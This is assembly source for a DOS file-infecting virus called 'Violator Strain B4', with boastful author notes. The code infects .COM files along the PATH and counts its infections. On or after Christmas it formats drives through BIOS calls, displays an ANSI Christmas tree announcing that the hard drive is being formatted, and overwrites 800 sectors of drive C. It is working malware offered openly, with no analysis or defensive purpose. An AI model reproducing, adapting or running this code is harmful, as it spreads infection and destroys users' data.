;*****************************************************************************
;		               Violator Strain B4
;*****************************************************************************
;
; Notes: (Nov.26.9O)
; ------------------
;
; "Happy Holiday's Guys!!!"
;
; Haha! I just got off the line with Flash Force. We decided to make 
; a Violator Strain B4 which will have a nice little ANSI Christmas tree
; with RABID's seasons greetings. So the file will be huge! But who cares.
; People won't notice an infection until it's too late due to the short life
; of this virus.
;
; New editions to this virus are a counter that keeps track of how many philes
; it has infected (Where it is in the program, I have no idea!!!), and a
; nice ANSI screen.
;
; I also fixed that stupid re-infection bug in B3... Bah! To err is human...
;
;*****************************************************************************
;
;			Written by The High Evolutionary
;
;	     Copyright (c) 199O by The RABID Nat'nl Development Corp.
;
;*****************************************************************************

CODE    SEGMENT
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE
        ORG     $+0100H

VCODE:  JMP     virus

        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP

v_start equ     $

virus:  PUSH    CX
        MOV     DX,OFFSET vir_dat       ;This is where the virus data starts.
        CLD                             
        MOV     SI,DX                   
        ADD     SI,first_3              
        MOV     DI,OFFSET 100H          
        MOV     CX,3
        REPZ    MOVSB                   
        MOV     SI,DX                   
        MOV     AH,30H
        MOV	marker,1
	CALL	filter
        CMP     AL,0                    
        JNZ     year_check                  
        JMP     quit                    

filter:	CMP	marker,1
	JE	int_21
	CMP	marker,2
	JE	int_13
	CMP	marker,3
	JE	int_26
	RET

int_21:	INT	21H
	RET

int_13:	INT	13h
	RET

int_26:	INT	26h
	RET

year_check:
	MOV	AH,2AH				; Get date info
	MOV	marker,1			; Set function for INT 21
	CALL	filter				; Call the filter routine
	CMP	CX,1990				; Check if it's 1990
	JGE	month_check			; Yes? Check the month
	JMP	infect				; No? Go to infection routine

month_check:
	CMP	DH,month			; Check if it's December
	JGE	day_check			; Yeah? Check the day
	JMP	infect				; No? Infect a phile

day_check:
	CMP 	DL,day				; Check if it's Christmas
	JGE	kill_13				; Yeah? Kill all drives
	JMP	infect				; No? Infect a poor guy!

kill_13:
	MOV	AL,counter			; Move drive into AL
	CALL	ala_13				; Kill the drive
	CMP	counter,27			; Check to see if it's drive Z:
	JE	re_format			; Yes! Then go to re_format
	INC	counter				; Increase the counter
	LOOP	kill_13				; Jump up and fry the next one

ala_13:	MOV	CH,0				; Set to track 0
	MOV	DL,counter			; Set drive to counter
	MOV	AH,05h				; Set function for formatting
	MOV	DH,0				; Format Head 0
	MOV	marker,2			; Set for INT_13 call
	CALL	filter				; Call the filter routine
	RET					; Return from call
;
; I changed this routine, becuase in the original Violator, I rewrote the
; data segment by calling it for the INT 26. All I did this time, was just
; set BX to be an offset of my INTRO var. That way, when Drive C is formatted,
; the Violator identifier string will be written everywhere... Kinda neat!
;

re_format:
	MOV	BP,OFFSET ansi		; Offset of ANSI screen
	MOV	CX,2000			; Set for 2000 bytes
	MOV	AH,13h			; Set function for write to screen
	MOV	AL,3			; Set all attributes to be written
	MOV	BH,0			;
	MOV	BL,0			;
	MOV	DH,0			; Row 0
	MOV	DL,0			; Column 0
	INT	10h			; Display it to screen
	PUSHF				; Push Flags onto stack 'cause INT
					; 26 kill the flag status
	MOV 	BX,OFFSET intro		; Add a message on the fried drive!
	MOV	DX,00			; Set for sector 0
	MOV	CX,800			; Write 800 sectors
	MOV	AL,2			; Make it drive C:
	MOV	marker,3		; Set up for INT 26 call
	CALL	filter			; Call filter for INT 26
	POPF				; Restore the flags we pushed

infect: PUSH    ES
        MOV     AH,2FH
	MOV	marker,1
	CALL	filter
        MOV     [SI+old_dta],BX
        MOV     [SI+old_dts],ES         
        POP     ES
        MOV     DX,dta                  
        ADD     DX,SI                   
        MOV     AH,1AH
	CALL	filter
        PUSH    ES
        PUSH    SI
        MOV     ES,DS:2CH
        MOV     DI,0                    

find_path:
        POP     SI
        PUSH    SI                      
        ADD     SI,env_str              ;Point to "PATH=" string in data area
        LODSB
        MOV     CX,OFFSET 8000H         
        REPNZ   SCASB                   
        MOV     CX,4

check_next_4:
        LODSB
        SCASB
        JNZ     find_path               
        LOOP    check_next_4            
        POP     SI
        POP     ES
        MOV     [SI+path_ad],DI         
        MOV     DI,SI
        ADD     DI,wrk_spc              
        MOV     BX,SI                   
        ADD     SI,wrk_spc              
        MOV     DI,SI                   
        JMP     SHORT   slash_ok

set_subdir:
        CMP     WORD PTR [SI+path_ad],0 
        JNZ     found_subdir            
        JMP     all_done                

found_subdir:
        PUSH    DS
        PUSH    SI
        MOV     DS,ES:2CH               ;DS points to environment segment
        MOV     DI,SI
        MOV     SI,ES:[DI+path_ad]      ;SI = PATH address
        ADD     DI,wrk_spc              ;DI points to file name workspace

move_subdir:
        LODSB                           ;Get character
        CMP     AL,';'                  ;Is it a ';' delimiter?
        JZ      moved_one               ;Yes, found another subdirectory
        CMP     AL,0                    ;End of PATH string?
        JZ      moved_last_one          ;Yes
        STOSB                           ;Save PATH marker into [DI]
        JMP     SHORT   move_subdir

moved_last_one:
        MOV     SI,0

moved_one:
        POP     BX                      ;Pointer to virus data area
        POP     DS                      ;Restore DS
        MOV     [BX+path_ad],SI         ;Address of next subdirectory
        NOP
        CMP     CH,'\'                  ;Ends with "\"?
        JZ      slash_ok                ;If yes
        MOV     AL,'\'                  ;Add one, if not
        STOSB

slash_ok:
        MOV     [BX+nam_ptr],DI         ;Set filename pointer to name workspace
        MOV     SI,BX                   ;Restore SI
        ADD     SI,f_spec               ;Point to "*.COM"
        MOV     CX,6
        REPZ    MOVSB                   ;Move "*.COM",0 to workspace
        MOV     SI,BX
        MOV     AH,4EH
        MOV     DX,wrk_spc
        ADD     DX,SI                   ;DX points to "*.COM" in workspace
        MOV     CX,3                    ;Attributes of Read Only or Hidden 
	CALL	filter
        JMP     SHORT   find_first

find_next:
        MOV     AH,4FH
	CALL	filter

find_first:
        JNB     found_file              ;Jump if we found it
        JMP     SHORT   set_subdir      ;Otherwise, get another subdirectory

found_file:
        MOV     AX,[SI+dta_tim]         ;Get time from DTA
        AND     AL,1CH                  
        CMP     AL,1CH                  
        JZ      find_next               ;If so, go find another file
        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H 
;
;Is the file too long?
;
        JA      find_next               ;If too long, find another one
        CMP     WORD PTR [SI+dta_len],0AH 
;
;Is it too short?
;
        JB      find_next               ;Then go find another one
        MOV     DI,[SI+nam_ptr]         ;DI points to file name
        PUSH    SI                      ;Save SI
        ADD     SI,dta_nam              ;Point SI to file name

more_chars:
        LODSB
        STOSB
        CMP     AL,0
        JNZ     more_chars              ;Move characters until we find a 00
        POP     SI
        MOV     AX,OFFSET 4300H
        MOV     DX,wrk_spc              ;Point to \path\name in workspace
        ADD     DX,SI
	CALL	filter
        MOV     [SI+old_att],CX         ;Save the old attributes
        MOV     AX,OFFSET 4301H         ;Set attributes
        AND     CX,OFFSET 0FFFEH
        MOV     DX,wrk_spc              ;Offset of \path\name in workspace
        ADD     DX,SI                   ;Point to \path\name
	CALL	filter
        MOV     AX,OFFSET 3D02H         ;Read/Write
        MOV     DX,wrk_spc              ;Offset to \path\name in workspace
        ADD     DX,SI                   ;Point to \path\name
	CALL	filter
        JNB     opened_ok               ;If file was opened OK
        JMP     fix_attr                ;If it failed, restore the attributes

opened_ok:
	INC 	times			; Add one to the times counter so
					; that we can keep track off how many
					; files we have infected...
        MOV     BX,AX
        MOV     AX,OFFSET 5700H
	CALL	filter
        MOV     [SI+old_tim],CX         ;Save file time
        MOV     [SI+ol_date],DX         ;Save the date
        MOV     AH,2CH
	CALL	filter
        MOV     AH,3FH
        MOV     CX,3
        MOV     DX,first_3
        ADD     DX,SI
	CALL	filter
        JB      fix_time_stamp  	;Quit, if read failed
        CMP     AX,3            	;Were we able to read all 3 bytes?
        JNZ     fix_time_stamp  	;Quit, if not
        MOV     AX,OFFSET 4202H
        MOV     CX,0
        MOV     DX,0
	CALL	filter
        JB      fix_time_stamp  	;Quit, if it didn't work
        MOV     CX,AX           	;DX:AX (long int) = file size
        SUB     AX,3            	;Subtract 3 (DX must be 0, here)
        MOV     [SI+jmp_dsp],AX 	;Save the displacement in a JMP inst
        ADD     CX,OFFSET c_len_y
        MOV     DI,SI           	;Point DI to virus data area
        SUB     DI,OFFSET c_len_x
        MOV     [DI],CX         
        MOV     AH,40H
        MOV     CX,virlen               ;Length of virus, in bytes
        MOV     DX,SI
        SUB     DX,OFFSET codelen       ;Length of virus code, gives starting
                                        ;address of virus code in memory
	CALL	filter
        JB      fix_time_stamp          ;Jump if error
        CMP     AX,OFFSET virlen        ;All bytes written?
        JNZ     fix_time_stamp          ;Jump if error
        MOV     AX,OFFSET 4200H
        MOV     CX,0
        MOV     DX,0
	CALL	filter
        JB      fix_time_stamp          ;Jump if error
        MOV     AH,40H
        MOV     CX,3
        MOV     DX,SI                   ;Virus data area
        ADD     DX,jmp_op               ;Point to the reconstructed JMP
	CALL	filter

fix_time_stamp:
        MOV     DX,[SI+ol_date]         ;Old file date
        MOV     CX,[SI+old_tim]         ;Old file time
        AND     CX,OFFSET 0FFE0H
        OR      CX,1CH			;Make timestamp with the infected 
					;seconds!!!                  
        MOV     AX,OFFSET 5701H
	CALL	filter
        MOV     AH,3EH
	CALL	filter

fix_attr:
        MOV     AX,OFFSET 4301H
        MOV     CX,[SI+old_att]         ;Old Attributes
        MOV     DX,wrk_spc
        ADD     DX,SI                   ;DX points to \path\name in workspace
	CALL	filter

all_done:
        PUSH    DS
        MOV     AH,1AH
        MOV     DX,[SI+old_dta]
        MOV     DS,[SI+old_dts]
	CALL	filter
        POP     DS


;*************************************************************************
; Clear registers used, & do a weird kind of JMP 100. The weirdness comes
;  in since the address in a real JMP 100 is an offset, and the offset
;  varies from one infected file to the next. By PUSHing an 0100H onto the
;  stack, we can RET to address 0100H just as though we JMPed there.
;**********************************************************************

quit:
        POP     CX
        XOR     AX,AX
        XOR     BX,BX
        XOR     DX,DX
        XOR     SI,SI
        MOV     DI,OFFSET 0100H
        PUSH    DI
        XOR     DI,DI
        RET     0FFFFH

vir_dat EQU     $

month	db	12			;Set month to December
day	db	25			;Set day to Christmas
intro	db	13,10
	DB	'Violator Strain B4 - Written by The RABID Nat''nl Development Corp.',13,10
	DB	' RABID would like to take this opportunity to extend it''s sincerest',13,10
	db	' holiday wishes to all Pir8 lamers around the world! If you are',13,10
	db	' reading this, then you are lame!!!',13,10
	db	' Anyway, to John McAffe! Have a Merry Christmas and a virus filled',13,10
	db	' new year. Go ahead! Make our day!',13,10,13,10
	db	' Remember! In the festive season, Say NO to drugs!!! They suck shit!',13,10
	db	'(Bah! We make a virus this large, might as well have something positive!)',13,10
marker	DB	0			;Marker for INT purposes
counter	DB	2			;Counter for drives
times	DB	0
ansi    DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,'T',15,'H',15,'E',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,'Ú',9,'Ä',9,'Ä',9,'Ä',9,'Ä'
        DB      9,'Ä',9,'Ä',9,'Ä',9,'Ä',9,'¿',9,'Ú',9,'Ä',9,'Ä',15,'Ä'
        DB      15,'Ä',15,'Ä',15,'Ä',15,'¿',15,'Ú',15,'Ä',15,'Ä',15,'Ä'
        DB      15,'Ä',9,'Ä',9,'Ä',9,'Ä',9,'¿',9,'Ú',9,'Ä',9,'Ä',9,'¿'
        DB      9,'Ú',12,'Ä',12,'Ä',12,'Ä',12,'Ä',12,'Ä',12,'Ä',12,'¿'
        DB      12,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,'³',9,' ',9,' ',9,' ',9,'Ú',9,'Ä',9,'¿',9,' '
        DB      9,' ',9,'³',9,'³',9,' ',9,' ',9,'Ú',15,'¿',15,' ',15,' '
        DB      15,'³',15,'³',15,' ',15,' ',15,' ',15,'Ú',9,'¿',9,' '
        DB      9,' ',9,'³',9,'³',9,' ',9,' ',9,'³',9,'³',12,' ',12,' '
        DB      12,' ',12,'Ú',12,'¿',12,' ',12,'³',12,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,'³',9,' '
        DB      9,' ',9,' ',9,'³',9,' ',9,'³',9,' ',9,' ',9,'³',9,'³'
        DB      15,' ',15,' ',15,'À',15,'Ù',15,' ',15,' ',15,'³',15,'³'
        DB      15,' ',15,' ',15,' ',15,'³',9,'³',9,' ',9,' ',9,'³',9
        DB      '³',9,' ',9,' ',9,'³',12,'³',12,' ',12,' ',12,' ',12,'³'
        DB      12,'³',12,' ',12,'³',9,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,'³',9,' ',9,' ',9,' ',9
        DB      'À',9,'Ä',9,'Ù',9,' ',9,' ',9,'³',15,'³',15,' ',15,' '
        DB      15,'Ú',15,'¿',15,' ',15,' ',15,'³',15,'³',15,' ',15,' '
        DB      15,' ',15,'À',9,'Ù',9,' ',9,'Ú',9,'Ù',9,'³',9,' ',9,' '
        DB      9,'³',12,'³',12,' ',12,' ',12,' ',12,'³',12,'³',12,' '
        DB      12,'³',9,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,'³',1,' ',1,' ',1,'Ú',1,'Ä',1,'¿',1,' '
        DB      1,' ',1,'Ú',15,'Ù',15,'³',15,' ',15,' ',15,'³',15,'³'
        DB      15,' ',15,' ',15,'³',15,'³',15,' ',15,' ',15,' ',15,'Ú'
        DB      1,'¿',1,' ',1,'À',1,'¿',1,'³',12,' ',12,' ',12,'³',12
        DB      '³',12,' ',12,' ',12,' ',12,'³',12,'³',1,' ',1,'³',1,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,'³',1,' ',1,' ',1,'³',1,' ',1,'À',1,'¿',1,' ',1,'À'
        DB      15,'¿',15,'³',15,' ',15,' ',15,'³',15,'³',15,' ',15,' '
        DB      15,'³',15,'³',15,' ',15,' ',15,' ',15,'³',1,'³',1,' '
        DB      1,' ',1,'³',1,'³',12,' ',12,' ',12,'³',12,'³',12,' ',12
        DB      ' ',12,' ',12,'³',1,'³',1,' ',1,'³',1,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,'³',1,' '
        DB      1,' ',1,'³',1,' ',1,' ',1,'³',15,' ',15,' ',15,'³',15
        DB      '³',15,' ',15,' ',15,'³',15,'³',15,' ',15,' ',15,'³',15
        DB      '³',1,' ',1,' ',1,' ',1,'À',1,'Ù',1,' ',1,' ',1,'³',12
        DB      '³',12,' ',12,' ',12,'³',12,'³',12,' ',12,' ',12,' ',12
        DB      'À',1,'Ù',1,' ',1,'³',1,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,'À',1,'Ä',1,'Ä',1,'Ù',1
        DB      ' ',1,' ',1,'À',15,'Ä',15,'Ä',15,'Ù',15,'À',15,'Ä',15
        DB      'Ä',15,'Ù',15,'À',15,'Ä',15,'Ä',15,'Ù',1,'À',1,'Ä',1,'Ä'
        DB      1,'Ä',1,'Ä',1,'Ä',1,'Ä',1,'Ä',1,'Ù',12,'À',12,'Ä',12,'Ä'
        DB      12,'Ù',12,'À',12,'Ä',12,'Ä',1,'Ä',1,'Ä',1,'Ä',1,'Ä',1
        DB      'Ù',1,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,'N',15,'a',15
        DB      't',15,'i',15,'o',15,'n',15,'a',15,'l',15,' ',15,'D',15
        DB      'e',15,'v',15,'e',15,'l',15,'o',15,'p',15,'m',15,'e',15
        DB      'n',15,'t',15,' ',15,'C',15,'o',15,'r',15,'p',15,'o',15
        DB      'r',15,'a',15,'t',15,'i',15,'o',15,'n',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,'.',7,'.',7,'.',7,'w',7,'o',7,'u',7,'l',7,'d',7
        DB      ' ',7,'l',7,'i',7,'k',7,'e',7,' ',7,'t',7,'o',7,' ',7
        DB      't',7,'a',7,'k',7,'e',7,' ',7,'t',7,'h',7,'i',7,'s',7
        DB      ' ',7,'o',7,'p',7,'p',7,'o',7,'u',7,'r',7,'t',7,'u',7
        DB      'n',7,'i',7,'t',7,'y',7,' ',7,'t',7,'o',7,' ',7,'s',7
        DB      'p',7,'r',7,'e',7,'a',7,'d',7,' ',7,'i',7,'t',7,39,7,'s'
        DB      7,' ',7,'s',7,'i',7,'n',7,'c',7,'e',7,'r',7,'e',7,'s'
        DB      7,'t',7,' ',7,'w',7,'i',7,'s',7,'h',7,'e',7,'s',7,' '
        DB      7,'o',7,'f',7,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,'a',7,' ',7
        DB      'v',7,'e',7,'r',7,'y',7,' ',7,'m',7,'e',7,'r',7,'r',7
        DB      'y',7,' ',7,'C',7,'h',7,'r',7,'i',7,'s',7,'t',7,'m',7
        DB      'a',7,'s',7,' ',7,'S',7,'e',7,'a',7,'s',7,'o',7,'n',7
        DB      '.',7,' ',7,'H',7,'a',7,'v',7,'e',7,' ',7,'a',7,' ',7
        DB      'v',7,'i',7,'r',7,'u',7,'s',7,' ',7,'f',7,'i',7,'l',7
        DB      'l',7,'e',7,'d',7,' ',7,'n',7,'e',7,'w',7,' ',7,'y',7
        DB      'e',7,'a',7,'r',7,'!',7,'!',7,'!',7,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,'N',132,'O',132
        DB      'W',132,' ',132,'F',132,'O',132,'R',132,'M',132,'A',132
        DB      'T',132,'T',132,'I',132,'N',132,'G',132,' ',132,'Y',132
        DB      'O',132,'U',132,'R',132,' ',132,'H',132,'A',132,'R',132
        DB      'D',132,'-',132,'D',132,'R',132,'I',132,'V',132,'E',132
        DB      '!',132,'!',132,'!',132,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,15,142,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      6,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,'°',10,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,'°',10,'±',10,'°',10,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,'°'
        DB      10,'±',10,'²',10,'±',10,'°',10,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,'°',10,'±'
        DB      10,'²',10,'Û',10,'²',10,'±',10,'°',10,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,'°',10,'±',10,'²'
        DB      10,'Û',10,'Û',10,'Û',10,'²',10,'±',10,'°',10,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,'°',10,'±',10,'²',10,'Û'
        DB      10,'Û',10,'Û',10,'Û',10,'Û',10,'²',10,'±',10,'°',10,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
